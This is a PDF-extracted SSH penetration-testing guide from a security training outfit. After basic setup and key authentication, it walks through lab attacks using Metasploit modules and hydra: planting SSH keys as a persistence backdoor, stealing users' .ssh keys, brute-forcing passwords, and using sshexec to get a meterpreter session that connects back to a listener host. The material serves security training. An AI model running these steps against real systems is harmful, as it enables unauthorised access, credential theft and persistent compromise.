---
id: ckb-7fb67cb1856a
title: SSH Penetration Testing
category: offensive-security
format: guide
language: en
tags: [credential-access, cryptography, linux, metasploit, password-security, persistence]
authors: [unknown]
license: NOASSERTION
added: 2026-10-04
classification:
  method: heuristic
  confidence: 0.55
---

 Page 2 of 25

Contents
Introduction to SSH ............................................................................3
SSH Installation ..................................................................................3
SSH Port Scanning ..............................................................................3
Methods to Connect SSH ....................................................................4
Terminal Command (Linux) .............................................................................. 4
Putty (Windows) .............................................................................................. 4
Port Redirection .................................................................................6
Port Redirection Testing .....................................................................7
Establish SSH connection using RSA key .............................................8
Exploit SSH with Metasploit ............................................................. 16
SSH Key Persistence- Post Exploitation .......................................................... 16
Stealing the SSH key....................................................................................... 18
SSH login using pubkey .................................................................................. 20
SSH Password cracking ..................................................................... 22
SSH Public Key Login Scanner ........................................................... 23
SSH User Code Execution.................................................................. 24
Conclusion: ...................................................................................... 25

 Page 3 of 25

Introduction to SSH
The SSH protocol, also known as Secure Shell, is a technique for secure and reliable remote login from one
computer to another. It offers several options for strong authentication, as it protects the connections
and communications\ security and integrity with strong encryption. It is a secure alternative to the non-
protected login protocols (such as telnet, rlogin) and insecure file transfer methods (such as FTP).
SSH Installation
It is very easy to install and configure the SSH service. We can directly install the SSH service by using the
openssh-server package from the Ubuntu repo. To install any service, you must have a root privilege
account and then follow the given below command.

When you execute the above command, it will extract the package and install the default configuration
on the host machine. You can check the open port with the help of the netstat command on the host
machine.

SSH Port Scanning
If you don’t have direct access to the host machine, use nmap to remotely identify the port state that is
considered to be the initial step of the penetration test. Here we’re going to use Kali Linux to perform
penetration testing. So, to find an open port on a remote network, we'll use an nmap version scan, which
will not only find an open port but also perform a banner grab that displays the installed version of the
service.

apt install openssh-server
nmap -sV -p22 192.168.1.103

 Page 4 of 25

Methods to Connect SSH
Terminal Command (Linux)
Now execute the following command to access the ssh shell of the remote machine as an authorised user.

username: ignite Password: 123

Putty (Windows)
Step1: Install putty.exe and run it, then enter the HOST IP address <192.168.1.103> and port <22>, also
choose to connect type as SSH.
ssh ignite@192.168.1.103

 Page 5 of 25

Step2: To establish a connection between the client and the server, a putty session will be generated that
requires a login credential.

Username: ignite
Password: 123

 Page 6 of 25

Port Redirection
By default, ssh listens on port 22, which means if the attacker identifies port 22 as open, then he can try
attacks on port 22 in order to connect with the host machine. Therefore, a system admin chooses port
redirection or port mapping by changing its default port to another in order to receive the connection
request from the authorised network.

Follow the below steps for port redirection:

Step1: Edit the sshd_config from inside the /etc/sshd using the editor

nano /etc/ssh/sshd_config

 Page 7 of 25

Step2: Change port 22 into 2222 and save the file.
Step3: Then restart ssh

Port Redirection Testing
Thus, when we have run the scan on port 22, it has shown the port state as CLOSE for SSH, whereas port
2222 is OPEN for SSH, which can be seen in the given image.

 Page 8 of 25

Establish SSH connection using RSA key
Strong passwords don’t seem to be decent to secure the server because a brute force attack can crack
them. That’s why you need an additional security method to secure the SSH server.

Another necessary feature to authenticate clients to the server is SSH key pairs. It consists of a long
string of characters: a public and a private key. You can place the public key on the server and the
private key on the client machine and unlock the server by connecting the private key of the client
machine. Once the keys match up, the system permits you to automatically establish an SSH session
without the need to type in a password.

Ssh-keygen is a tool for creating new authentication key pairs for SSH. Such key pairs are used for
automating logins, single sign-on, and for authenticating hosts.

Thus, we will follow the steps for generating a key pair for authenticated connection.

Step1: Run the given command to generate an ssh key pair (id_rsa and id_rsa.pub) on the host machine
Ubuntu.

 ssh-keygen

 Page 9 of 25

Step2: Same should be done on the client machine which is authorized to establish the connection with
the host machine (ubuntu).

Step3: Once the ssh key pair (id_rsa and id_rsa.pub) get generated then rename the id_rsa.pub into
authorized_keys as show in the given image.

ssh-keygen
cd .ssh
ls
cat id_rsa.pub > authorized_keys

 Page 10 of 25

Step4: Share the authorized_keys with the host machine by copying it into the .ssh directory.

Step5: Edit the sshd_config from inside the /etc/sshd using the editor

nano /etc/ssh/sshd_config

 Page 11 of 25

Step 6: Check the "passwordauthentication no" box.

As a result, only the authorised machine which rsa key can establish a connection with the host machine
without using a password.

If you try to connect to the ssh server using your password and username, the server will reject your
request because it will authenticate the request that has an authorised key.

 Page 12 of 25

Step7: Copy the id_rsa key from Kali Linux to the windows machine, to established connection using
authorized keys on the windows machine,

Step8: Install puttygen.exe

Step 9: Run puttygen.exe and load the id_rsa file, then "save as key" it as "Key."

 Page 13 of 25

Step10: Use putty.exe to connect with the host machine by entering the hostname 192.168.1.103 and
port 22.

 Page 14 of 25

Step11: Navigate to SSH >auth and browse the key private key that you have saved as mention in step 9.

 Page 15 of 25

This will establish an ssh connection between the Windows client and the server without using a
password.

 Page 16 of 25

Exploit SSH with Metasploit
SSH Key Persistence- Post Exploitation
Consider a situation whereby by compromising the host machine you have obtained a meterpreter session
and want to leave a permanent backdoor that will provide a reverse connection for next time.

When port 22 on the host machine is open, the Metasploit module "SSH Key Persistence-a Post Exploit"
can be used to accomplish this.

This module will add an SSH key to a specified user (or all users), allowing remote SSH access to the victim
at any time.

As can be seen in the image given, it added authorised keys to /home / ignite/.ssh and stored a private
key within /root/.msf4/loot
use post/linux/manage/sshkey_persistence
set session 1
exploit

 Page 17 of 25

We ensure this by connecting to the host machine via port 22 using the private key generated above.
Here, I renamed the private "key" and granted permission to 600 people.

Bravo!! It works without any congestion, and in this way, we can use the SSH key as a persistence
backdoor.
chmod 600 key
ssh -i key ignite@192.168.1.103

 Page 18 of 25

Stealing the SSH key
Consider the following scenario: you have obtained a meterpreter session by compromising the host
machine, port 22 is open for SSH, and you want to steal the SSH public key and authorised key.This is
possible with the help of the Metasploit module "Multi Gather OpenSSH PKI Credentials Collection-a Post
Exploit," which is discussed further below.

This module will collect the contents of all users .ssh directories on the targeted machine. Additionally,
known_hosts, authorized_keys, and any other files are also downloaded. This module is largely based on
firefox_creds.rb.

From the given below image, you can see we have all our authorised keys stored in the /home/ignite/.ssh
directory on our local machine at /root/.msf4/loot and we now use those keys for login into an SSH server.

This can be done manually by downloading keys directly from inside /home/ignite/.ssh as shown in the
below image.
use post/multi/gather/ssh_creds
set session 1
exploit

 Page 19 of 25

We ensure this by connecting the host machine via port 22 using the private key downloaded above. Let’s
change the permission for the rsa key, and to do this, follow the steps given below.

It works without any congestion, and in this way, we can use ssh key as a persistence backdoor.
chmod 600 id_rsa
ssh -I id_rsa ignite@192.168.1.103

 Page 20 of 25

SSH login using pubkey
Considering you have the id_rsa key of the host machine and want to obtain a meterpreter session via
Metasploit, this can be achieved with the help of the following module.

This module will test ssh logins on a range of machines using a defined private key file and report
successful logins. If you have loaded a database plugin and connected to a database, this module will
record successful logins and hosts so you can track your access. A key file may be a single private key or
several private keys in a single directory.

use auxiliary/scanner/ssh /ssh_login_pubkey
set rhosts 192.168.1.103
set username ignite
set key_path /root/.ssh/id_rsa
exploit

 Page 21 of 25

 Page 22 of 25

This will give a command session which can be further updated into the meterpreter session by executing
the following command.

SSH Password cracking
We can test a brute force attack on SSH to guess the password or test threshold policy while performing
penetration testing on SSH. It requires a dictionary for username list and password list. Here we have a
username dictionary named "user.txt" and a password list named "pass.txt" to perform the brute force
attack with the help of hydra.

As a result, you can observe that the host machine has no defence against brute force attack, and we were
able to obtain ssh credential.

sessions -u 1
hydra -L user.txt -P pass.txt 192.168.1.103 ssh

 Page 23 of 25

To protect your service against brute force attacks, you can use fail2ban, which is an IPS. Read more
here to setup fail2ban IPS on the network.

If you observe the given below image, you will see that this time the connection request is dropped by
the host machine when we try to launch a brute force attack.

SSH Public Key Login Scanner
This module will test SSH logins on a range of machines using a defined private key file and report
successful logins. If you have loaded a database plugin and connected to a database, this module will
record successful logins and hosts so you can track your access. A key file may be a single private key or
several private keys in a single directory. However, only a single passphrase is supported, so it must either
be shared between subject keys or belong to only a single one.

As a result, you can see that user "ignite" is authorised to connect to the host machine's SSHD via the
public.
hydra -L user.txt -P pass.txt 192.168.1.103 ssh
use auxiliary/scanner/ssh/ssh_identify_pubkeys
set rhosts 192.168.1.103
set user_file /root/user.txt
set key_path /root/.ssh/id_rsa.pub
exploit

 Page 24 of 25

SSH User Code Execution
This module connects to the target system and executes the necessary commands to run the specified
payload via SSH. If a native payload is specified, an appropriate stager will be used. As a result, we provided
the host IP as well as the username and password, and if everything goes as planned, we will receive a
meterpreter session on our listening machine.

As a result, you can observe that we have a meterpreter session on the host machine.
use exploit/multi/ssh/sshexec
set rhosts 192.168.1.103
set username ignite
set password 123
set srvhost 192.168.1.107
exploit

 Page 25 of 25

Conclusion:
In this post, we try to discuss the possible ways to secure SSH and perform penetration testing against
such a scenario.

JOIN OUR
TRAINING PROGRAMS
www.ignitetechnologies.in
BEGINNER
Network Pentest
Bug Bounty
Wireless Pentest
Network Security
Essentials
Ethical Hacking
ADVANCED
EXPERT
Burp Suite Pro
CTF
Windows
Linux
Pro
Infrastructure VAPT
APT’s - MITRE Attack Tactics
MSSQL Security Assessment
Active Directory Attack
Red Team Operation
Privilege Escalation
Web
Services-API
Android Pentest
Computer
Forensics
Advanced
Metasploit
CLICK HERE
